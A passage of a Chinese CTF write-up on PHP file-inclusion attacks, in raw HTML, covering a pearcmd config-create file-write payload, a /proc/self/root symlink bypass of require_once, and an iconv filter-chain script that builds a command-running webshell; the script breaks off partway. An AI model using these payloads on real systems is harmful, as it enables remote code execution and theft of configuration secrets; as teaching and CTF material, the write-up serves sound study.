class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;D:\xampp\php&amp;gt;php.exe pear/pearcmd.php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Commands:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;build                  Build an Extension From C Source&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bundle                 Unpacks a Pecl Package&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;channel-add            Add a Channel&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;channel-alias          Specify an alias to a channel name&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;channel-delete         Remove a Channel From the List&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;channel-discover       Initialize a Channel from its server&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;channel-info           Retrieve Information on a Channel&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;channel-login          Connects and authenticates to remote channel server&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;channel-logout         Logs out from the remote channel server&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;channel-update         Update an Existing Channel&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;clear-cache            Clear Web Services Cache&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;config-create          Create a Default configuration file&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;create-config 是可以创建文件的，这个命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中。&lt;/p&gt;
&lt;p&gt;因此我们最终构造的 payload 如下 &lt;code&gt;GET /index.php?+config-create+/&amp;amp;file=/usr/local/lib/php/pearcmd.php&amp;amp;/&amp;lt;?=phpinfo()?&amp;gt;+/tmp/hello.php HTTP/1.1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;简单解释一下，这里的 config-create 会被当做命令行参数执行，执行的第一个参数是要写的文件内容，第二个参数是稳健位置，然后在通过包含即可&lt;/p&gt;
&lt;p&gt;这个好就好在，docker 下的 php 默认都是开这个选项的，而且不用时间竞争，而且路径文件名可控，即使不是 docker 下，仍可以尝试，万一人家要安装依赖没关呢&lt;/p&gt;
&lt;h2 id=&#34;通过多级软链接绕过require_once&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#通过多级软链接绕过require_once&#34;&gt;#&lt;/a&gt; 通过多级软链接绕过 require_once&lt;/h2&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php require_once &amp;#x27;/www/config.php&amp;#x27;; // some logic here... &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  require_once $_GET[&amp;#x27;file&amp;#x27;]; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果我们想要读取 /www/config.php 中的文件，通常可以通过 php://filter 来读取，比如 &lt;code&gt;1.1.1.1/a.php?file=php://filter/read=convert.base64-encode/resource=/www/config.php&lt;/code&gt; ，但但如果这个文件在前面已经被包含过了，则第二次包含就会失败，即使使用 php://filter 也一样。&lt;/p&gt;
&lt;p&gt;正常情况下，PHP 会将用户输入的文件名进行 resolve，转换成标准的绝对路径，这个转换的过程会将…/、./、软连接等都进行计算，得到一个最终的路径，再进行包含。每次包含都会经历这个过程，所以，只要是相同的文件，不管中间使用了…/ 进行跳转，还是使用软连接进行跳转，都逃不过最终被转换成原始路径的过程，也就绕不过 require_once。&lt;/p&gt;
&lt;p&gt;但是，如果软连接跳转的次数超过了某一个上限，Linux 的 lstat 函数就会出错，导致 PHP 计算出的绝对路径就会包含一部分软连接的路径，也就和原始路径不相同的，即可绕过 require_once 限制。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/proc/self&lt;/code&gt;  指向当前进程的 &lt;code&gt;/proc/pid/&lt;/code&gt; ， &lt;code&gt;/proc/self/root/&lt;/code&gt;  是指向 &lt;code&gt;/&lt;/code&gt;  的符号链接，在 Linux 下，最常见的软连接就是 /proc/self/root，这个路径指向根目录。所以，我们可以多次使用这个路径：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;require_once &amp;#x27;/www/config.php&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;include_once &amp;#x27;/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/www/config.php&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;hxp-ctf&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hxp-ctf&#34;&gt;#&lt;/a&gt; hxp ctf&lt;/h2&gt;
&lt;h3 id=&#34;the-end-of-lfi&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#the-end-of-lfi&#34;&gt;#&lt;/a&gt; the end of LFI&lt;/h3&gt;
&lt;p&gt;在 PHP 中，我们可以利用 PHP Base64 Filter 宽松的解析，通过 iconv filter 等编码组合构造出特定的 PHP 代码进而完成无需&lt;strong&gt;临时文件&lt;/strong&gt;的 RCE 。&lt;/p&gt;
&lt;p&gt;前置知识 0x00&lt;/p&gt;
&lt;p&gt;php://filter ，当使用 base64-decode 时，字符 &amp;lt;、?、;、&amp;gt;、空格等一共有 7 个字符不符合 base64 编码的字符范围将被忽略，而合法字符将被正常解码，我们的正常字符包括 &lt;code&gt;A-Za-z0-9\/\=\+&lt;/code&gt; 。同时需要注意，base64 在编码的时候是四个字节为一组的，这个在上面 session 包含中有过详细解释&lt;/p&gt;
&lt;p&gt;举个师傅的例子:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$a = &amp;quot;\x1bY\xffQ\xfa&amp;quot;;              //YQ 为 a 的 base64 编码&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;var_dump(base64_decode($a));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;// string(1) &amp;quot;a&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;很明显，我们的不可见字符，控制字符也被忽略了&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;因此我们可以使用 base64 先 decode 在 incode 来去除 base64 不认可的非法字符，这是我们后面做题的基础&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;前置知识 0x01 包含文件中的 php 代码&lt;/p&gt;
&lt;p&gt;假如我们有一个文件 e，文件中的内容是：PD9waHAgcGhwaW5mbygpOw==，即 &lt;code&gt;&amp;lt;?php phpinfo();&lt;/code&gt;  的 base64 编码，我们有两种方式包含：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;include &amp;quot;php://filter/convert.base64-decode/resource=./e&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;include &amp;quot;php://filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOw==&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;include&lt;/code&gt;  函数实际包含的是 Base64 解码后的 PHP 代码。&lt;/p&gt;
&lt;p&gt;前置知识 0x02 convert.iconv&lt;/p&gt;
&lt;p&gt;PHP Filter 当中有一种  &lt;code&gt;convert.iconv&lt;/code&gt;  的 Filter ，可以用来将数据从字符集 A 转换为字符集 B ，其中这两个字符集可以从  &lt;code&gt;iconv -l&lt;/code&gt;  获得，这个字符集比较长，不过也存在一些实际上是其他字符集的别名。&lt;/p&gt;
&lt;p&gt;举个例子，我们可以从 utf8 转换为 utf7 的编码&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$url = &amp;quot;php://filter/convert.iconv.UTF-8%2fUTF-7/resource=data:,some&amp;lt;&amp;gt;text&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo file_get_contents($url);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;// Output:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;// some+ADwAPg-text&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可以看到，我们在转换的同时成了一些其他的字符，比如 &lt;code&gt;+ADwAPg-&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这样结合我们的 base64 的 decode 忽略非法字符，和文件内容包含，也许可以直接转换出我们的 webshell&lt;/p&gt;
&lt;p&gt;比如我们可以通过 UTF8 转 CSISO2022KR 得到字符 C：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$url = &amp;quot;php://filter/&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$url .= &amp;quot;convert.iconv.UTF8.CSISO2022KR&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$url .= &amp;quot;/resource=data://,aaaaaaaaaaaaaa&amp;quot;;     //我们这里简单使用 `data://` 来模拟文件内容读取。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;var_dump(file_get_contents($url));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;// hexdump:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;// 00000000  73 74 72 69 6e 67 28 31  38 29 20 22 1b 24 29 43  |string(18) &amp;quot;.$)C|&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;// 00000010  61 61 61 61 61 61 61 61  61 61 61 61 61 61 22 0a  |aaaaaaaaaaaaaa&amp;quot;.|&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;而 c 之前的非法字符，我们只需要利用 decode+incode 去除即可&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$url = &amp;quot;php://filter/&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$url .= &amp;quot;convert.iconv.UTF8.CSISO2022KR&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$url .= &amp;quot;|convert.base64-decode|convert.base64-encode&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$url .= &amp;quot;/resource=data://,aaaaaaaaaaaaaa&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;var_dump(file_get_contents($url));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;// hexdump&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;// 00000000  73 74 72 69 6e 67 28 31  32 29 20 22 43 61 61 61  |string(12) &amp;quot;Caaa|&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;// 00000010  61 61 61 61 61 61 61 61  22 0a                    |aaaaaaaa&amp;quot;.|&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;前置知识结束，我们开始构造 payload：&lt;/p&gt;
&lt;p&gt;由于 &lt;code&gt;&amp;lt;&lt;/code&gt;  在 base64 是非法字符，我们无法直接构造 &lt;code&gt;&amp;lt;?php&lt;/code&gt;  的形式，但我们可以构造 &lt;code&gt;&amp;lt;?php&lt;/code&gt; base64 encode 过后的编码，在使用 base64decode 还原即可正常包含&lt;/p&gt;
&lt;p&gt;构造 &lt;code&gt;&amp;lt;&lt;/code&gt;  我们可以生成 PAxxxxx 的编码，解码过后我们就可以生成 &amp;lt;，我们接下来要做的就是能找到可以通过编码转换生成我们需要的字符，但后面也可能生成垃圾字符，我们只需要 decode+incode 就可以去除&lt;/p&gt;
&lt;p&gt;我们最后的 webshell 长这样： &lt;code&gt;PD89YCRfR0VUWzBdYDs7Pz4=&lt;/code&gt;  是&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?=`$_GET[0]\`;;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;编码后的结果，两个；；的原因是一个；的 base64  &lt;code&gt;PD89YCRfR0VUWzBdYDs/Pg==&lt;/code&gt;  中间有个 /，通过编码转换不好找的这个字符&lt;/p&gt;
&lt;p&gt;其实我发现&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?=`$_GET[0]`; ?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;你也可以加个空格，这样也不会有 \， &lt;code&gt;PD89YCRfR0VUWzBdYDsgPz4=&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;最终我们的脚本长这样：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$base64_payload = &amp;quot;PD89YCRfR0VUWzBdYDs7Pz4&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$conversions = array(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;R&amp;#x27; =&amp;gt; &amp;#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;B&amp;#x27; =&amp;gt; &amp;#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;C&amp;#x27; =&amp;gt; &amp;#x27;convert.iconv.UTF8.CSISO2022KR&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;8&amp;#x27; =&amp;gt; &amp;#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;9&amp;#x27; =&amp;gt; &amp;#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;f&amp;#x27; =&amp;gt; &amp;#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;s&amp;#x27; =&amp;gt; &amp;#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;z&amp;#x27; =&amp;gt; &amp;#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;U&amp;#x27; =&amp;gt; &amp;#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;P&amp;#x27; =&amp;gt; &amp;#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;V&amp;#x27; =&amp;gt; &amp;#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;0&amp;#x27; =&amp;gt; &amp;#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;Y&amp;#x27; =&amp;gt; &amp;#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;W&amp;#x27; =&amp;gt; &amp;#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;d&amp;#x27; =&amp;gt; &amp;#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;D&amp;#x27; =&amp;gt; &amp;#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;7&amp;#x27; =&amp;gt; &amp;#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;4&amp;#x27; =&amp;gt; 